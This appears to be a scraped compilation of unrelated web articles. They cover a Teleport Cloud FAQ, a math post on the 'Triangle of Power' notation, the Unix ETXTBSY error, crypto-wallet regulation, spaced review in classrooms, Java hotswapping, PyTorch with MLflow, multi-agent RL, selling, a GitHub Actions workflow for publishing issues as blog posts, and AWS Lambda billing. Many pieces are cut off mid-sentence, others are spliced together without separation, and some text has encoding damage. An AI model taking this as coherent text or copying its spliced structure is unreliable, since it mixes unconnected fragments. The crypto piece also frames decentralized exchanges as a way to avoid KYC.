<strong>A:</strong> We expect Teleport Cloud to be suitable to use in non mission critical systems that do not require <sup>24</sup>⁄<sub>7</sub> access or a guaranteed SLA. We recommend a fallback option be available in the event of error or outage.</p>

<p><strong>Q: Are you using AWS-managed encryption keys, or CMKs via KMS?</strong>
<strong>A:</strong> We use AWS-managed keys. Currently there is no option to provide your own key.</p>

<h2 id="starting-with-teleport-cloud">Starting with Teleport Cloud</h2>

<p>If you’re interested in trying a fully hosted Teleport, or simply want to hear more, please <a href="https://goteleport.com/teleport/cloud/">reserve your spot</a> on the waiting list!</p>

<p>Initially, we are focusing on the most common US-based hosting regions, but we need more input from you on where to go next. Teleport will not be worthy of its name until you can instantly “teleport” your software <a href="https://goteleport.com/resources/white-papers/environment-free-computing/">anywhere you want</a>!</p>

December 2, 2020 | https://www.science4all.org/article/the-triangle-of-power/ | <a href="https://web.archive.org/web/*/https://www.science4all.org/article/the-triangle-of-power/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The web is full of amazing and surprising creations. One such creation that has caught my attention lately was a video by 3Blue1Brown on the so-called “Triangle of Power”.</p>
<p><iframe width="720" height="405" src="https://www.youtube.com/embed/sULa9Lc4pck" frameborder="0" allowfullscreen=""></iframe></p>
<p>Apparently, the ideas originated on <a href="http://math.stackexchange.com/questions/30046/alternative-notation-for-exponents-logs-and-roots" target="_blank">a Math Stack Exchange thread</a> asking for more unified notations for exponents, logarithms and radicals. Indeed, while these formulas $2^3 = 8$, $\sqrt[3]{8} = 2$ and $\log_2 8 = 3$ are all discussing the same relationship that holds between 2, 3 and 8, they look so different that a student may not witness their commonality.</p>
<p>I see. So, the question is whether there could be a more explicit notations to unify and better visualize this relationship…</p>
<p>Yes indeed. One alternative notation has gained much interest. It is the so-called <strong>Triangle of Power</strong>. In our case, this triangle of power can depict the relationship between 2, 3 and 8 in a wonderfully compact and harmonious way, namely by denoting $_2\overset{3}{\Delta}_8$.</p>
<p>And that triangle $_2\overset{3}{\Delta}_8$ is a formula?</p>
<p>No! It’s more like an identity in itself. To perform computations, it might be useful to move one of the entries of the triangle to the other side of an equal sign as follows:<br>
$$_2\overset{3}{\Delta}_8 \Longleftrightarrow \; _2\overset{3}{\Delta} = 8\Longleftrightarrow \overset{3}{\Delta}_8 = 2\Longleftrightarrow \; _2\Delta_8 = 3.$$</p>
<p>3Blue1Brown argues that this beautiful notation greatly simplifies the understanding of the mathematical underlying objects, namely exponents, logarithms and radicals. This claim is quite disturbing at first. Indeed, again and again, I had to translate the equations of his video into equations in terms of the notations I am more familiar with. I could not think in terms of the triangle of power.</p>
<p>So you think it’s a bad notation…</p>
<p>Actually, no. This just helped realize how dependent on current flawed notations my mathematical thinking was! That’s not good! Moreover, I did get stunned by some of the many artful equations that this new notation yielded, e.g.<br>
$$_x\overset{y}{\Delta}_{_x\overset{y}{\Delta}}, \; _x\overset{_x\Delta_z}{\Delta}_z, \; _{\overset{y}{\Delta}_z}\overset{y}{\Delta}_z, \; \overset{+}{\Delta}_\times, \;  _\times\Delta_\times, \; _\times\overset{\oplus}{\Delta}, \; _x\overset{y}{\Delta} = \overset{1/y}{\Delta}_x, \; _{_x\overset{y}{\Delta}}\overset{z}{\Delta}_{_x\overset{yz}{\Delta}}, \; _x\Delta_y \; _y\Delta_z = \; _x\Delta_z, \; _e\overset{i\tau}{\Delta}_1, \; _e\overset{i\tau/4}{\Delta}_i \ldots $$</p>
<p>By the end of the video, I got hooked.</p>
<p>Even though you couldn’t follow the computations…</p>
<p>That’s true. And it would have been hypocritical of me to claim that they were indeed the way to go, if I had not yet experienced the actual benefaction of using and thinking in terms of this triangle of power. Following 3Blue1Brown’s advice, it seemed that the only way for me to do so is to go explore and play with the triangle of power. So I gave myself homeworks.</p>
<p>What homework?</p>
<p>I’ve decided to redefine and rederive well-known results about exponents, logarithms and radicals. And since I love the web, I couldn’t not share it with you.  Enjoy!</p>
<h2>Defining the Triangle of Power</h2>
<p>Let us start from the bottom. We’ll assume that integers and real numbers have been well-defined, as well as the addition and the multiplication. In this section, we’ll redefine the triangle of power $_x\overset{y}{\Delta}_z$ for all $x,z &gt; 0$ and $y \in \mathbb R$. It won’t be straightforward though. The first step is to define the triangle of power for top integer values of $y$, then for top rational values, and finally we shall use continuity to generalize it for real tops.</p>
<p>OK… Let’s start with integer tops.</p>
<p>Let’s define $_x\overset{n}{\Delta}$ for all $x &gt; 0$ <a href="http://www.science4all.org/article/proof-by-induction/" target="_blank">by induction</a> on $n$. For $n=0$, we define $_x\overset{0}{\Delta}_1$, and we consider the induction $_x\overset{n\pm 1}{\Delta}_{x^{\pm 1} \times \overset{n}{_x\Delta}}$. We indeed use the “+” sign to define induction over positive integers, and the “-” sign for induction over negative integers.</p>
<p>Wait… Are you sure you’ve given an actual inductive definition?</p>
<p>Getting used to the meaning of the compact triangle-of-power notation is likely to be troublesome at first. What we really mean in terms of equations is that we define respectively $_x\overset{0}{\Delta} = 1$ and $_x\overset{n\pm1}{\Delta} = x^{\pm1} \times\; _x\overset{n}{\Delta}$. More generally, we have<br>
$$_x\overset{n}{\Delta}_y \Longleftrightarrow \; _x\overset{n}{\Delta} = y\Longleftrightarrow \overset{n}{\Delta}_y = x\Longleftrightarrow \; _x\Delta_y = n.$$ From this definition, it follows straightforwardly that $_1\overset{n}{\Delta}_1$, $\;_x\overset{m+n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{n}{\Delta}$, $\; _x\overset{-n}{\Delta} = \;_{1/x}\overset{n}{\Delta} = \;\left( _x\overset{n}{\Delta} \right)^{-1}$ and that $x \mapsto \;_x\overset{n}{\Delta}$ is strictly increasing for $n \geq 1$ (and thus injective).</p>
<p>I think I follow…</p>
<p>Take your time. These notations can be very troubling.</p>
<p>Sure. You can move on.</p>
<p>Let us now a prove our first beautiful theorem. For $x&gt;0$ and $n,m\in \mathbb Z$, we have $_{_x\overset{m}{\Delta}}\overset{n}{\Delta}_{_x\overset{mn}{\Delta}}$. I cannot help to comment on how cool I think that this elegantly structured notation is a theorem! We prove this by induction on $n$. The case $n=0$ boils down to the definition of the triangle of power for zero top value. Assuming that the result holds for $n$, we now have, using the induction definition of the triangle of power, $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta} = \;_x\overset{m}{\Delta} \; \times\, _{_x\overset{m}{\Delta}}\overset{n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{mn}{\Delta} = \;_x\overset{m(n+1)}{\Delta}$. This equality can be equivalently rewritten as $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta}_{_x\overset{m(n+1)}{\Delta}}$, which concludes the induction proof.</p>
<p>There is elegance in the notation indeed…</p>
<p>I know! Here’s another beautiful theorem. For all $x,y &gt; 0$ and $m,n \in \mathbb Z$, we have $_x\overset{n}{\Delta}_{y} \Longleftrightarrow \; _x\overset{mn}{\Delta}_{_y\overset{m}{\Delta}}$. Using the previous result, we see that the right-hand side is equivalent to $_{_x\overset{n}{\Delta}}\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. For the left-to-right implication we can replace the left of the main triangle by $y$, yielding $_y\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$, which is equivalent to $_y\overset{m}{\Delta} = \; _y\overset{m}{\Delta}$, which is clearly true. To go from right to left, we notice that $z = y$ is a solution of $_z\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. Yet the map $z \mapsto \; _z\overset{m}{\Delta}$ is injective, thus it is the only solution. Thus $_x\overset{n}{\Delta} = y$, which concludes the proof for positive integers $n$. </p>
<p>Cool! And I guess that the case for negative integers $n$ is dealt with similarly.</p>
<p>Yes! The theorem we’ve just proved can now be used to define the triangle power for rational tops. For $p \in \mathbb Z$ and $q \in \mathbb Z^*$, we define $_x\overset{p/q}{\Delta}_{y}$ if $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}}$. To prove the consistency of this definition, we need to make sure that it holds for any $p’,q’$ instead of $p,q$, whenever $p’/q’ = p/q$. To prove this it suffices to show that $_x\overset{p/q}{\Delta}_{y} \Longleftrightarrow _x\overset{kp/kq}{\Delta}_y$, i.e. $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$. But this boils down to applying the two previous theorems. Indeed, $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow\; _x\overset{kp}{\Delta}_{_{_y\overset{q}{\Delta}}\overset{k}{\Delta}} \Longleftrightarrow \;_x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$.</p>
<p>Cool! Top integers, checked. Top rationals, checked. All we have left to define are top reals!</p>
<p>Yes. But to get there, we’ll need to first prove another beautiful theorem: $_x\overset{p/q}{\Delta}_y \Longleftrightarrow \; _x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{p}{\Delta} = \; _y\overset{q}{\Delta} \Longleftrightarrow \; _y\overset{q}{\Delta}_{_x\overset{p}{\Delta}} \Longleftrightarrow \; _y\overset{q/p}{\Delta}_x$. In other words, by fixing $r = p/q$, we obtain the reflection theorem. For $x,y &gt; 0$ and $r \in \mathbb Q^*$, we have $_x\overset{r}{\Delta}_y \Longleftrightarrow \; _y\overset{1/r}{\Delta}_x$. This is so pretty! Moreover, by continuity, in the next section, we’ll see that this holds for nonzero real tops as well.</p>
<p>Are we now ready to define the triangle of power for top reals?</p>
<p>Almost! We now need to prove that for any $x\geq 1$, we have $_x\overset{1/n}{\Delta} \rightarrow 1$. Notice to start with that $_x\overset{1/n}{\Delta} \geq 1$. Now we consider $\epsilon &gt; 0$. Then it is easy to see that $_{1+\epsilon}\overset{n}{\Delta} \rightarrow \infty$. In particular, there exists $N$ large enough so that $_{1+\epsilon}\overset{N}{\Delta} \geq x$. Moreover, for $n \geq N$, we have $_{1+\epsilon}\overset{n}{\Delta} \geq x$. By montonicity of the triangle power, this means that $1+\epsilon \geq \overset{n}{\Delta}_x = \;_x\overset{1/n}{\Delta} \geq 1$. This corresponds exactly to saying that $_x\overset{1/n}{\Delta} \rightarrow 1$. Using $_{1/x}\overset{1/n}{\Delta} = \left(\; _x\overset{1/n}{\Delta} \right)^{-1}$ and monotonocity, we can generalize this result for all $x&gt;0$ and rational top. Namely, for any $x&gt;0$ and $\epsilon &gt;0$, there exists some $\delta&gt;0$ such that for any rational $r \in (1-\delta,1+\delta) \cap \mathbb Q$, we have $\left|\;_x\overset{r}{\Delta} – 1\right| \leq \epsilon$.</p>
<p>In other words, the right side of the triangle of power is sort of continuous with respect to rational tops.</p>
<p>This is almost what we’ve proved, and exactly where I’m going with that! Let’s show that if a rational sequence $r_n$ converges, then, for all $x &gt; 0$, the sequence $_x\overset{r_n}{\Delta}$ converges too. We have $ \left| \; …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>What is behind Unix's 'Text file is busy' error</h2>

	<p><small>April  6, 2016</small></p>
</div><div><p>Perhaps you have seen this somewhat odd Unix error before:</p>


<blockquote><pre># cp prog /usr/local/bin/prog
cp: cannot create regular file 'prog': Text file is busy
</pre>
</blockquote>

<p>This is not just an unusual error message, it's also a rare instance
of Unix being friendly and not letting you blow your foot off with
a perfectly valid operation that just happens to be (highly) unwise.
To understand it, let's first work out what exact operation is
failing. I'll do this with <code>strace</code> on Linux, mostly because it's
what I have handy:</p>

<pre>$ cp /usr/bin/sleep /tmp/
$ /tmp/sleep 120 &amp;
$ strace cp /usr/bin/sleep /tmp/
[...]
open("/usr/bin/sleep", O_RDONLY)        = 3
fstat(3, {st_mode=S_IFREG|0755, st_size=32600, ...}) = 0
open("/tmp/sleep", O_WRONLY|O_TRUNC)    = -1 ETXTBSY (Text file busy)
[...]
</pre>

<p>There we go. <code>cp</code> is failing when it attempts to open <code>/tmp/sleep</code>
for writing and truncate it, which we have a running program, and
the specific Unix errno value here is <code>ETXTBSY</code>. If you experiment
some more you'll discover that we're allowed to remove <code>/tmp/sleep</code>
if we want to, just not write to it or truncate it (at least on
Linux; the specifics of what's disallowed may vary slightly on other
Unixes). This is an odd limitation for Unix, because normally there's
nothing that prevents one process from modifying a file out from
underneath another process (even in harmful ways). Unix leaves it
up to the program(s) involved to coordinate things between themselves,
rather than enforcing a policy of 'no writing if there are readers'
or something in the kernel.</p>

<p>But running processes are special, because really bad things usually
happen if you modify the on-disk code of a running process. The
problem is virtual memory, or more exactly paged virtual memory.
On a system with paged virtual memory, programs aren't loaded into
RAM all at once and then kept there; instead they're paged into RAM
in bits and pieces as bits of code (and data) are needed.  In fact,
some times already-loaded bits and pieces are dropped from RAM in
order to free up space, since they can always be loaded back in from
disk.</p>

<p>Well, they can be loaded back in from disk if some joker hasn't
gone and changed them on disk, at least. All of this paging programs
into RAM in sections only works if the program's file on disk doesn't
ever change while the program is running. If the kernel allowed
running programs to change on disk, it could wind up loading in one
page of code from version 1 of the program and another page from
version 2. If you're lucky, the result would segfault. If you're
unlucky, you might get silent malfunctions, data corruption, or
other problems. So for once the Unix kernel does not let you blow
your foot off if you really want to; instead it refuses to let you
write to a program on disk if the program is running. You can
truncate or overwrite any other sort of file even if programs are
using it, just not things that are part of running programs. Those
are special.</p>

<p>Given the story I've just told, you might expect <code>ETXTBSY</code> to
have appeared in Unix in or around 3BSD, which is more or less the
first version of Unix with paged virtual memory. However, this is
not the case. <code>ETXTBSY</code> turns out to be much older than BSD Unix,
going back to at least Research V5. Research Unix through V7 didn't
have paged virtual memory (it only swapped entire programs in and
out), but apparently the Research people decided to simplify their
lives by basically locking the files for executing programs against
modification.</p>

<p>(In fact Research Unix was stricter than modern Unixes, as it looks
like you couldn't delete a program's file on disk if it was running.
That section of the kernel code for <code>unlink()</code> gets specifically
commented out no later than 3BSD, <a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=3BSD/usr/src/sys/sys/sys4.c">cf</a>.)</p>

<p>PS: the 'text' in 'text file' here actually means 'executable code',
per say <code>size</code>'s output. Of course it's not just the actual executable
code that could be dangerous if it changed out from underneath a
running program, but there you go.</p>

<h3>Sidebar: the way around this if you're updating running programs</h3>

<p>To get around this, all you have to do is remove the old file before
writing the new file into place. This (normally) doesn't cause any
problems; the kernel treats the 'removed but still being used by a
running program' executable the same way it treats any 'removed but
still open' file. <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/UnixPendingDeleteProblem">As usual</a> the file
is only actually removed when the last reference goes away, in this
case the last process using the old executable exits.</p>

<p>(Of course <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/NFSPendingDeletes">NFS throws a small monkey wrench into things</a>, sometimes in <a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/SafelyUpdatingNFSFilesII">more than one way</a>.)</p>

Now, Coinbase requires you to KYC your wallet before allowing you to withdraw freshly purchased BTC. What are your options?</p><p>For one thing, you can use a decentralized exchange to trade crypto.

That's why blockchains are built to enable censorship-free financial access.</p><p>As CoinDesk noted <a href="https://www.coindesk.com/crypto-wallet-regulations-industry-pros">in a recent analysis of the situation</a>, there exists a revealing difference in the language used to refer to crypto wallets by regulators and crypto investors.</p><p>Regulators call crypto wallets <em>unhosted wallets,</em> whereas investors refer to them as <em>self-hosted wallets</em>. The difference here is all about privacy — crypto users believe in financial independence, freedom from oversight, and digital asset autonomy.</p><p>On the other hand, an unhosted wallet points to the view that such wallets lack hosting — a situation that should be remedied by regulation and the cooperation of centralized institutions.</p><p>This seemingly small difference in language does indeed point to a large divide in exactly how each side views the purpose of storing crypto assets.</p><p>As Armstrong noted in his original Twitter thread, the crypto industry has been preparing for this eventuality for at least a few months. In fact, they've known long enough to form a lobby, and have responded to the rumors by sending the US Treasury a plea to leave crypto alone.</p><p>The regulation is expected to come into effect before the year's end, mostly owing to the US election results and the impending changing of the guard. As such, the rush is on for Mnuchin to push through regulations before time is up.</p><p>Does data-collection on self-hosted crypto wallets amount to the US government declaring a ban on cryptocurrency wallets we know them?</p><p><strong>Not really</strong>.</p><p>Moreover, can the government enforce these regulations and push people onto the centralized platforms decentralized blockchains were built to avoid?</p><p>The answer there is clearer: <strong>certainly not.</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606858594054_28135"><div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When my students bombed their first semester exam, it shocked me. It was my second year of teaching eighth grade math, and unlike the previous year, my students had actually done well on the exit tickets and tests up to that point. However, my students seemed to have forgotten everything.</p><p>The next semester, I made a concerted effort to carve out time for review, but it was tedious, and I never knew which specific topics to review, and how often to review each topic.</p><p>Years later when I was no longer a teacher, I found out that there was actually a science behind the best way to review, and that there was also <a href="https://www.gwern.net/Spaced-repetition" target="_blank" rel="noopener noreferrer">a large body of research to back it up</a>.</p><h5>Ebbinghaus and the Forgetting Curve</h5><p>This body of research goes as far back as the 1880s, when a German psychologist named Hermann Ebbinghaus mapped out memory and how we forget over time.</p><p><img src="https://www.researchgate.net/profile/Bo_Ae_Chun/publication/324816198/figure/fig1/AS:620205050982405@1524879815703/Ebbinghaus-forgetting-curve-and-review-cycle.png" alt="Forgetting Curve"></p><p>In his model of memory, Ebbignhaus stated that when content is first learned, without review, memory of that content deteriorates quickly. However, with each subsequent review and retrieval of that information, the memory becomes more durable, and over time, less and less review is required to keep retention fresh.</p><p>When I first learned about this, I felt an "Aha!" moment as Ebbinghaus broke down exactly why my students struggled when I was teaching.</p><p>For me, because planning out new lessons was already such a tough process, I never had enough time to adequately review throughout the school year. Instead, every year in March, I dedicated an entire month to review all of the content before the state exam. In fact, several lower-performing districts encouraged students and teachers to have â€œreview weeksâ€� to cram review before state assessments. We would power through countless hours of material that students had already "learned", but it never stuck as well as I would have liked.</p><p>Ebbinghaus proposed something that I had always intuitively known, but failed to put into practice in my own classroom: spreading out review over time is much more effective than cramming it all into one session.</p><h5>More Research</h5><p>Since Ebbinghuas, several researchers have fleshed out this idea of the forgetting curve and spaced review.</p><p>To start, <a href="https://pcl.sitehost.iu.edu/rgoldsto/courses/dunloskyimprovinglearning.pdf" target="_blank" rel="noopener noreferrer">John Dunlosky, a professor of psychological sciences at Kent State University, and others broke down 10 different learning techniques</a>, including common practices like re-reading and highlighting, and found that spaced review was one of the most effective ways to learn and retain knowledge and skills.</p><p>Meanwhile, <a href="https://www.dartmouth.edu/~cogedlab/pubs/Kang(2016,PIBBS).pdf" target="_blank" rel="noopener noreferrer">Sean Kang, a cognitive psychologist at the University of Melbourne, highlighted spaced review as a highly effective learning technique</a> that does not require more time and drastic changes to the classroom.</p><p>Specifically, he states:</p><blockquote><p>Incorporating spaced practice into education can be a cost-effective approachâ€” learning becomes more durable in the same amount of time (relative to massed practice), and this can lead to future savings because less time needs to be spent on relearning content that has been forgotten, leaving more time for other productive learning activities (e.g., higher order analysis, application of knowledge). <strong>In short, spaced practice enhances the efficacy and efficiency of learning, and it holds great promise as an educational tool.</strong></p></blockquote><p>In a different paper, <a href="https://scottbarrykaufman.com/wp-content/uploads/2014/01/Lindsey-et-al.-2014.pdf" target="_blank" rel="noopener noreferrer">Robert Lindsey, another research scientist and now the founder of Imagen Technologies, and others also assessed the efficacy of a computer program that personalized review for each student over time</a>. In this study, personalized spaced review improved retention by 16.5%!</p><p>The more research I read, the more I was perplexed â€”perplexed as to why I hadn't learned about this research-backed learning technique while I was teaching. I had sat through countless hours of professional development and undergone a long certification process, but I had never once heard about how to maximize learning in my classroom through spaced review.</p><p>Clearly, there was a gap between research and practical application, and I wanted to see if there was a way to fill that gap.</p><h5>Spacing in the Classroom</h5><p>So how would spaced review work in the classroom?</p><p>After I learned about spaced review, I shared it with my best friend, Chris, who is currently a science teacher in Texas. He also dug into the research and was excited to try it out in his classroom the next school year. He did a deep dive into all of the learning tools available to help him facilitate spaced review in the classroom. Most tools he came across seemed better suited for individual learners, and were not well-suited for the classroom.</p><p>Long story short, Chris and I decided to build out Podsie, a platform that fully automates spaced review in a personalized way for each student. With Podsie, Chris creates an exit ticket of around 5-8 questions that assesses the content that students learned that day. When students complete a question, the question goes into that student's personal deck.</p><p>Each student's personal deck is powered by a spacing algorithm that determines when the student should review a question again. Then, Chris gives his students 10 minutes in the beginning of class to complete every question that is due on their personal decks, ensuring that each student reviews exactly what they should be reviewing on that day.</p><p>With this approach, Chris no longer has to do the traditional cram session before state assessments. This year, even with distance learning, the spaced review has been so effective for him that he's decided to completely cut out that month of review that he also traditionally did. Like the quote from Sean Kang above predicted, spacing out review saved Chris a significant amount of time because "less time needs to be spent on relearning content that has been forgotten."</p><h5>Last Thoughts</h5><p>In Sean Kang's paper on spacing, he reflects:</p><blockquote><p>Despite over a century of research findings demonstrating the spacing effect, however, it does not have widespread application in the classroom. <strong>The spacing effect is â€œa case study in the failure to apply the results of psychological researchâ€� (Dempster, 1988, p. 627).</strong></p></blockquote><p>Podsie hopes to be that bridge between psychological research and the classroom.</p><p>We know this year has been extraordinarily challenging for everyone in the education system, and we hope that by providing an effective and efficient tool, each student and teacher's life can be made a little easier.</p><p><strong><em>If you're interested in using Podsie in your classroom to help with your students' retention of content, you can <a href="https://www.podsie.org/#sign-up">sign up here!</a></em></strong></p></div></div></div>]]>

<h2><span id="Abstract">Abstract</span></h2>
<p>The current hotswapping mechanism in the HotSpot VM only allows changing the bodies of methods at runtime. We are working on an approach that allows arbitrary changes. This talk is about our experiences implementing a prototype in HotSpot that supports adding and deleting of methods and fields as well as performing changes to the class hierarchy. What are the conditions for dynamic code evolution to have a clear semantics and what kind of changes should be forbidden? What are meaningful applications of dynamic code evolution for Java and their requirements? The talk will conclude with ideas for future work to make dynamic code evolution stable and performant.

Looking at the momentum in research, as shown on <a href="http://paperswithcode.com/trends">paperswithcode.com/trends</a>, we can see that the research community has embraced PyTorch as its tool of choice. Conversely, the enterprise and production users of the world such as Lyft Level 5, Microsoft, AstraZeneca and many others, are realizing real product value through deploying PyTorch at scale. MLOps and end-to-end lifecycle management of machine learning is an important bridge between these communities, and the combination of state of the art AI developed on PyTorch and MLOps is a powerful force that will bring the impact of cutting edge research to products.</p><p>Today, we are announcing a number of technical contributions to enable end-to-end support for MLflow usage with PyTorch, including support for: autologging via PyTorch Lightning; TorchServe integration through a new deployment plug-in; and a sample end-to-end workflow targeting HuggingFace Transformers. This work, done in collaboration between members of the technical teams at Databricks/MLflow core maintainers and the PyTorch core development team within Facebook, is just the beginning.

However, the real world is not zero-sum nor does it have fixed teams; humans face numerous social dilemmas and must learn when to cooperate and when to compete. To successfully deploy agents into the human world, it may be important that they be able to understand and help in our conflicts. Unfortunately, selfish MARL agents typically fail when faced with social dilemmas. In this work, we show evidence of emergent direct reciprocity, indirect reciprocity and reputation, and team formation when training agents with randomized uncertain social preferences (RUSP), a novel environment augmentation that expands the distribution of environments agents play in. RUSP is generic and scalable; it can be applied to any multi-agent environment without changing the original underlying game dynamics or objectives. In particular, we show that with RUSP these behaviors can emerge and lead to higher social welfare equilibria in both classic abstract social dilemmas like Iterated Prisoner's Dilemma as well in more complex inter-temporal environments.</p><p><a href="https://arxiv.org/pdf/2011.05373.pdf">... keep reading</a></p></blockquote><p>The Rundown</p><ul data-rte-list="default"><li><p><a href="https://arxiv.org/pdf/2011.05373.pdf">Article</a></p></li><li><p><a href="https://github.com/openai/multi-agent-emergence-environments">OpenAI Multi-agent Emergence Environments</a></p></li><li><p>Credit: <a href="https://twitter.com/bobabowen">@bobabowen</a> at <a href="https://twitter.com/bobabowen">@OpenAI</a></p></li></ul></div></div><div data-block-type="2" id="block-53f769d2554fd04a77c0"><div><h2>Stay Up To Date</h2><p>That's all for ML UTD #25.

<p>As a teenager, I was very shy and insecure. Especially when it came to the important stuff: women.</p>



<p>I remember being terrified of talking face-to-face to the girl who could’ve been my first girlfriend… had I talked to her.</p>



<p>Fast-forward 6–7 years.</p>



<p>I’m working as a B2C salesman in an international education agency, closing deals worth thousands, sometimes even tens of thousands of dollars.</p>



<p>But how the hell did that happen? Well, I learned how to sell.</p>



<p>Selling is a skill anybody can learn, no matter how shy or insecure they are. And, as you can tell from my story, it’s a skill with a very high ROI — it literally changes your life. It feels almost like a superpower.</p>



<p>If you want to make a living as an independent creator business you need to know how to sell. Because as a business, cash is your oxygen. And without sales there’s no cash.</p>



<p>It doesn’t matter how cheap, beautiful or amazing the product you’re building is — if you can’t make people pay you money for it, you won’t get very far.</p>



<p>Once you learn how to sell, my friend, you are unstoppable.</p>


<p><em>This piece is part of a series of 30 atomic essays where I explore what it means to be a&nbsp;<a href="https://rationalcreatives.substack.com/" target="_blank" rel="noreferrer noopener">rational creative</a>&nbsp;and the different aspects of being a creator online.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I got into the habit of dumping quick blog post ideas into issues on my blog’s repo. It’s a convenient place to iterate on them and share with friends for feedback before actually publishing on my blog post.</p><p><img src="https://shazow.net/posts/github-issues-as-a-hugo-frontend/100761218-a6cb2280-33c0-11eb-92df-1b52d91cc16e.png" alt="image"></p><p>The drafts keep accumulating, how do I trick myself into publishing more? Perhaps by reducing the effort required for the next step? Let’s do it!</p><h2 id="architecture">Architecture</h2><p>My blog is statically generated using <a href="https://github.com/gohugoio/hugo">Hugo</a>, the <a href="https://github.com/shazow/shazow.net">code is hosted on Github</a>, then when a pull request comes in it is built, previewed, and published on merge by <a href="https://netlify.com/">Netlify</a>.</p><p>The blog post drafts are posted as Github issues, so there is a clear gap: How do we convert issues into pull requests for Netlify? Enter Github Actions!</p><h2 id="github-action-issue-to-pull-request">Github Action: Issue to Pull Request</h2><p>My <a href="https://github.com/shazow/shazow.net/blob/master/.github/workflows/publish.yml">full workflow lives here</a> if we want to jump ahead, but let’s break down the broad strokes.</p><p>I decided to trigger the publishing process once an issue is labelled with ‘publish’, so let’s start with that:</p><div><pre><code data-lang="yaml"><span>name</span><span>:</span><span> </span>Publish<span> </span>post<span> </span>from<span> </span>issue<span>
</span><span>
</span><span></span><span>on</span><span>:</span><span>
</span><span>  </span><span>issues</span><span>:</span><span>
</span><span>    </span><span>types</span><span>:</span><span> </span><span>[</span><span>'labeled'</span><span>]</span><span>
</span><span>
</span><span></span><span>jobs</span><span>:</span><span>
</span><span>  </span><span>build</span><span>:</span><span>
</span><span>    </span><span>if</span><span>:</span><span> </span>${{<span> </span>github.event.label.name<span> </span>==<span> </span><span>'publish'</span><span> </span>}}<span>
</span><span>    </span><span>runs-on</span><span>:</span><span> </span>ubuntu-latest<span>
</span><span>    </span><span>steps</span><span>:</span><span>
</span><span>      </span>...<span>
</span></code></pre></div><p>Next up we want to specify the steps, first thing is to check out the repository into the action’s environment:</p><p>Once the source code is available, we want to generate the blog post from the issue metadata. Here is a very basic version of this, though I ended up doing more tweaking in the end:</p><div><pre><code data-lang="yaml"><span>      </span>- <span>name</span><span>:</span><span> </span>Generate<span> </span>Post<span>
</span><span>        </span><span>env</span><span>:</span><span>
</span><span>          </span><span>POST_TITLE</span><span>:</span><span> </span>${{<span> </span>github.event.issue.title<span> </span>}}<span>
</span><span>          </span><span>POST_BODY</span><span>:</span><span> </span>${{<span> </span>github.event.issue.body<span> </span>}}<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          cat &gt; "content/posts/${POST_TITLE}.md" &lt;&lt; EOF</span><span>
</span><span>          </span>${POST_BODY}<span>
</span><span>          </span>EOF<span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>One of the biggest serverless announcements from <a href="https://reinvent.awsevents.com/">AWS re:Invent 2020</a> is 1 ms billing for <a href="https://aws.amazon.com/lambda/pricing/">AWS Lambda</a> functions. This is an industry-leading change that fundamentally alters the cost of running many serverless applications.</p><p>In this post, I explain the impact and show how you can optimize your Lambda functions to take advantage of this new feature. This can help you drive down the cost of running serverless applications even further.</p><h2 id="h-how-lambda-billing-works">How Lambda billing works</h2><p>Lambda is an on-demand compute platform – it only runs in response to events, and you only pay when code is running.&nbsp;</p><p>There are two dimensions to <a href="https://aws.amazon.com/lambda/pricing/">Lambda pricing</a> – requests and duration. A request happens anytime that a function is invoked and these are charged at $0.20 per million, regardless of function size. Duration is calculated as a factor of time and memory usage at $0.0000166667 per GB-second. There is also a <a href="https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&amp;all-free-tier.sort-order=asc&amp;awsf.Free%2520Tier%2520Categories=categories%2523serverless">Free Tier</a> allowance of 1 million requests and up to 400,000 GB/s of compute every month. You are not charged for any Lambda usage under this level.</p><p>Before this announcement, the minimum duration for billing was 100 ms and the billable duration was always rounded up to the nearest 100 ms. This means that a function with 5 ms was rounded to 100 ms and a function with 385 ms duration was rounded to 400 ms. With the move to 1 ms billing, the smallest duration value is now 1 ms and all other usage is rounded up the next 1 ms.</p><h2 id="h-from-100-ms-to-1-ms-rounding-the-cost-difference-for-existing-code">From 100 ms to 1 ms rounding –the cost difference for existing code</h2><p>Lambda is designed for very high volumes of traffic and many production-based applications result in millions of invocations. This change in the duration granularity provides cost savings for almost all Lambda functions, and this will automatically appear on your AWS billing statement.&nbsp;</p><p>To see the impact of this pricing change for different function durations, I compare three types of Lambda function:</p><ol><li>Short-lived (~100 ms): these typically operate as “glue”, minimally processing data between AWS services.</li><li>Subsecond (under 1 second): for more complicated business logic handling more data.</li><li>Longer-lived functions (under 1 minute): for computationally complex logic, or functions calling out synchronously to third-party services.</li></ol><p>The following table takes a random sampling of durations for these three types of functions, then rounds the billable duration by 1 ms and 100 ms granularity:</p><figure><img loading="lazy" width="468" height="159" 